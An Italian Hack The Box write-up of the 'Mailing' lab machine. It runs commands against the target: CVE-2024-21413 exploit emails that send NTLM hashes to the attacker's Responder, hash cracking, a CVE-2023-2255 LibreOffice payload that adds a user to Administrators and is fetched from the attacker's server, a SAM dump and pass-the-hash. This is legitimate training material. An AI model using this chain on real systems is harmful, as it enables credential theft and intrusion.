
**TARGER: 10.10.11.14**
# INFORMATION GATHERING 

Iniziamo con i classici scan [Nmap](Note/Tool/Nmap.md)
```bash

┌──(kali㉿kali)-[~/htb/mailing]
└─$ nmap 10.10.11.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-19 19:48 CEST
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.048s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
135/tcp open  msrpc
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 5.47 seconds

┌──(kali㉿kali)-[~/htb/mailing]
└─$ sudo nmap -sSVC -p 25,80,110,135,139,143,445,465,587,993 --script vuln 10.10.11.14
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-19 19:49 CEST
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.047s latency).

PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
587/tcp open  smtp          hMailServer smtpd
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
993/tcp open  ssl/imap      hMailServer imapd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 237.64 seconds
```

Dal risultato di nmap sicuramente ci troviamo davanti ad un server mail windows

Uno scan su tutte le porte non ci da ulteriori informazioni.

# ENUMERATION

Visitano l'indirizzo alla porta 80 abbiamo conferma di quanto detto prima
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/mailing.png)

il pulsante in basso installation ci da scaricare un file pdf con le istruzione su come installare il tutto sia ambiente Windows che Linux
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/mailing2.png)

Nel frattempo avviamo anche dirsearch per vedere di enumerare le directory

```bash
┌──(kali㉿kali)-[~/htb/mailing]
└─$ dirsearch -u http://mailing.htb/ -x 403,404,400
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/htb/mailing/reports/http_mailing.htb/__24-07-19_20-01-00.txt

Target: http://mailing.htb/

[20:01:00] Starting:
[20:02:31] 200 -  541B  - /assets/
[20:02:31] 301 -  160B  - /assets  ->  http://mailing.htb/assets/
[20:02:52] 200 -   31B  - /download.php
```

ci trova `/download.php` che sembra interessante. 
Se lo visitiamo ci ritorna che non abbiamo specificato alcun file da scaricare 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/mailing3.png)
Proviamo ad intercettare il traffico con [BurpSuite](BurpSuite) per vedere cosa succede.

in questo [post](https://www.hmailserver.com/forum/viewtopic.php?t=31490) troviamo il percorso alla quale dovrebbero essere salvata la passaword dell'amministratore

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/mailing4.png)

Bene abbiamo una password ma sembra non essere in chiaro sembra essere un hash proviamo a romperlo con [Hashcat](Note/Tool/Hashcat.md)

```bash
┌──(kali㉿kali)-[~/htb/mailing]
└─$ hashcat cred.txt -a0 -m0 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4750HQ CPU @ 2.00GHz, 2136/4336 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7
Time.Started.....: Mon Jul 22 13:12:36 2024 (7 secs)
Time.Estimated...: Mon Jul 22 13:12:43 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1084.1 kH/s (0.42ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7563264/14344385 (52.73%)
Rejected.........: 0/7563264 (0.00%)
Restore.Point....: 7560192/14344385 (52.70%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: hon260 -> home38119
Hardware.Mon.#1..: Util: 12%

Started: Mon Jul 22 13:11:43 2024
Stopped: Mon Jul 22 13:12:45 2024
```

Bene abbiamo una password `homenetworkingadministrator`

Essendo un server mail windows ed ipotizzando che utilizzi outlook proviamo a vedere se troviamo qualche exploit.

Dopo qualche ricerca troviamo [questa CVE 2024-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) che consente a patto di avere credenziali valide di inviare una email che contiene una chiamata ad una risorsa condivisa (SMB) e questo ci consentirebbe di catture l'hash NTLM dell ' utente che effettua la richiesta.

Non ci resta che provare. 
Per prima cosa ci mettiamo in ascolto con il nostro responder.

```bash

┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0 -dvw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.49]
    Responder IPv6             [dead:beef:2::102f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-1P09VCYJ245]
    Responder Domain Name      [5IIH.LOCAL]
    Responder DCE-RPC Port     [49897]

[+] Listening for events...
```

eseguiamo l'exploit dandogli i seguenti parametri 

```bash
┌──(kali㉿kali)-[~/htb/mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└─$ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.49\meeting" --subject "update_outlook"

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.

```

Aspettiamo qualche momento e riceviamo la risposta  dal responder.

```
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:58afd4d067cb69d3:CCC1F3DA218A692E79CD61AE972CFB34:010100000000000000E3FD4E7AE2DA01075F01E721D335330000000002000800350049004900480001001E00570049004E002D0031005000300039005600430059004A0032003400350004003400570049004E002D0031005000300039005600430059004A003200340035002E0035004900490048002E004C004F00430041004C000300140035004900490048002E004C004F00430041004C000500140035004900490048002E004C004F00430041004C000700080000E3FD4E7AE2DA010600040002000000080030003000000000000000000000000020000076D76812C25476EAF1DB6C461370DA8537061E2B0CBF0F387061F8A6F908EC930A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340039000000000000000000
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:154df6f217f643ec:6071F0733DA3C360B36F2CEC7776D325:010100000000000000E3FD4E7AE2DA01861655D8C9AB1A7B0000000002000800350049004900480001001E00570049004E002D0031005000300039005600430059004A0032003400350004003400570049004E002D0031005000300039005600430059004A003200340035002E0035004900490048002E004C004F00430041004C000300140035004900490048002E004C004F00430041004C000500140035004900490048002E004C004F00430041004C000700080000E3FD4E7AE2DA010600040002000000080030003000000000000000000000000020000076D76812C25476EAF1DB6C461370DA8537061E2B0CBF0F387061F8A6F908EC930A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340039000000000000000000
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:3aff1483d3f6c2e8:F524902299CAD56F123F879E514BD706:010100000000000000E3FD4E7AE2DA0175FD712442FFD6300000000002000800350049004900480001001E00570049004E002D0031005000300039005600430059004A0032003400350004003400570049004E002D0031005000300039005600430059004A003200340035002E0035004900490048002E004C004F00430041004C000300140035004900490048002E004C004F00430041004C000500140035004900490048002E004C004F00430041004C000700080000E3FD4E7AE2DA010600040002000000080030003000000000000000000000000020000076D76812C25476EAF1DB6C461370DA8537061E2B0CBF0F387061F8A6F908EC930A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340039000000000000000000
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:9ac50cc034547707:9C9E68C631408D9A24C9609E27F1FE38:010100000000000000E3FD4E7AE2DA01E3304D20901E4E1A0000000002000800350049004900480001001E00570049004E002D0031005000300039005600430059004A0032003400350004003400570049004E002D0031005000300039005600430059004A003200340035002E0035004900490048002E004C004F00430041004C000300140035004900490048002E004C004F00430041004C000500140035004900490048002E004C004F00430041004C000700080000E3FD4E7AE2DA010600040002000000080030003000000000000000000000000020000076D76812C25476EAF1DB6C461370DA8537061E2B0CBF0F387061F8A6F908EC930A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340039000000000000000000
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:8dab3147a15e28a6:42CCB812C7A8E4E7F6B10E19E52E6303:010100000000000000E3FD4E7AE2DA01D83D21C0C82747500000000002000800350049004900480001001E00570049004E002D0031005000300039005600430059004A0032003400350004003400570049004E002D0031005000300039005600430059004A003200340035002E0035004900490048002E004C004F00430041004C000300140035004900490048002E004C004F00430041004C000500140035004900490048002E004C004F00430041004C000700080000E3FD4E7AE2DA010600040002000000080030003000000000000000000000000020000076D76812C25476EAF1DB6C461370DA8537061E2B0CBF0F387061F8A6F908EC930A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340039000000000000000000
```

non ci resta che rompere l'hash con [Hashcat](Note/Tool/Hashcat.md)

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 5600 maya::MAILING:58afd4d067cb69d3:CCC1F3DA218A692E79CD61AE972CFB34:010100000000000000E3FD4E7AE2DA01075F01E721D335330000000002000800350049004900480001001E00570049004E002D0031005000300039005600430059004A0032003400350004003400570049004E002D0031005000300039005600430059004A003200340035002E0035004900490048002E004C004F00430041004C000300140035004900490048002E004C004F00430041004C000500140035004900490048002E004C004F00430041004C000700080000E3FD4E7AE2DA010600040002000000080030003000000000000000000000000020000076D76812C25476EAF1DB6C461370DA8537061E2B0CBF0F387061F8A6F908EC930A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340039000000000000000000  -a0 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

MAYA::MAILING:58afd4d067cb69d3:ccc1f3da218a692e79cd61ae972cfb34:010100000000000000e3fd4e7ae2da01075f01e721d335330000000002000800350049004900480001001e00570049004e002d0031005000300039005600430059004a0032003400350004003400570049004e002d0031005000300039005600430059004a003200340035002e0035004900490048002e004c004f00430041004c000300140035004900490048002e004c004f00430041004c000500140035004900490048002e004c004f00430041004c000700080000e3fd4e7ae2da010600040002000000080030003000000000000000000000000020000076d76812c25476eaf1db6c461370da8537061e2b0cbf0f387061f8a6f908ec930a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340039000000000000000000:m4y4ngs4ri
```

  
Ora conosciamo le credenziali di maya e nella scansione nmap sopra abbiamo visto la porta 5985 aperta, quindi possiamo usare evil-winrm per connettere PowerShell.

```bash
┌──(root㉿kali)-[/home/kali/htb/mailing]
└─# evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents>
```

ci prendiamo la nostra user flag 

```bash
*Evil-WinRM* PS C:\Users\maya\Desktop> type user.txt
4ccb3082ee46dbdee8c412ed491e279d
```


# PRIVESC

Esplorando la cartella `Program Files` notiamo che è installato `LiberOffice` un software open source per la produttività che include strumenti per la creazione di documenti, fogli di calcolo, presentazioni e altro.  

```bash
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2024   5:30 PM                Common Files
d-----          3/3/2024   4:40 PM                dotnet
d-----          3/3/2024   4:32 PM                Git
d-----         4/29/2024   6:54 PM                Internet Explorer
d-----          3/4/2024   6:57 PM                LibreOffice
d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
d-----         2/27/2024   4:58 PM                MSBuild
...<snip>...
```

Troviamo la versione installata 
```bash
*Evil-WinRM* PS C:\Program Files\LibreOffice\readmes> type readme_en-US.txt
LibreOffice 7.4 ReadMe
```

 Vediamo se troviamo qualche vulnerabilità per questa versione.

Sembra che questa versione di LibreOffice sia affetta dalla  CVE2023-2255. 
Troviamo [questo script Python](https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file) che è progettato per generare un file ODT (Open Document Text) che sfrutta la vulnerabilità CVE-2023-2255 di LibreOffice per eseguire un comando specificato dall'utente.

Come comando gli diciamo di aggiungere l'utente maya al gruppo Administrator

```bash
┌──(kali㉿kali)-[~/htb/mailing/CVE-2023-2255]
└─$ python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
File exploit.odt has been created !
```

Non ci resta che scaricare l'exploit sul target. ( solito procedimento, tiriamo su un server python)


```bash
┌──(kali㉿kali)-[~/htb/mailing/CVE-2023-2255]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.14 - - [31/Jul/2024 14:19:44] "GET /exploit.odt HTTP/1.1" 200 -
```

>[!NB] Per vedere se abbiamo i permessi relativi alla scrittura su una directory possiamo utlizzare il modulo `get-acl` Questo comando mostrerà un elenco di autorizzazioni. Cerchiamo voci con il permesso `Write` o `FullControl` per il nostro utente o gruppo.  Esempio
>`(Get-Acl -Path C:\percorso\alla\cartella).Access`

```bash
*Evil-WinRM* PS C:\Users\maya\Downloads> curl -o exploit.odt 10.10.14.49:80/exploit.odt
*Evil-WinRM* PS C:\Users\maya\Downloads> dir


    Directory: C:\Users\maya\Downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/31/2024  10:48 PM          30526 exploit.odt
```

Verificiamo il gruppo di appartenenza dell'utente `maya`

```bash
*Evil-WinRM* PS C:\Important Documents> net user maya
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 4:16:20 AM
Password expires             Never
Password changeable          2024-04-12 4:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-07-31 2:21:18 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Usuarios
                             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.
```

Ed eseguiamo lo script

```bash
*Evil-WinRM* PS C:\Important Documents> "./exploit.odt"
./exploit.odt
```

Se ricontrolliamo il gruppo di appartenenza possiamo vedere che ora faccio parte di `Adminitratores` 

```
*Evil-WinRM* PS C:\Important Documents> net user maya
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 4:16:20 AM
Password expires             Never
Password changeable          2024-04-12 4:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-07-31 2:22:06 PM

Logon hours allowed          All

Local Group Memberships      *Administradores      *Remote Management Use
                             *Usuarios             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.
```

Ora che facciamo parte del gruppo `Administrator` possiamo utilizzare [CrackMapExec](Note/Tool/CrackMapExec.md) per dumpare  gli hash dal SAM

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing RDP protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
SMB         10.10.11.14     445    MAILING          [+] Dumping SAM hashes
SMB         10.10.11.14     445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
SMB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
SMB         10.10.11.14     445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
SMB         10.10.11.14     445    MAILING          [+] Added 6 SAM hashes to the database
```

utilizziamo impacket-wmiexec per collegarci con l'hash ottenuto 

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
mailing\localadmin

```

e ci prendiamo la root flag
```bash
C:\Users\localadmin\Desktop>type root.txt
8235b80c67b49cbc8daef126ee806ff0
```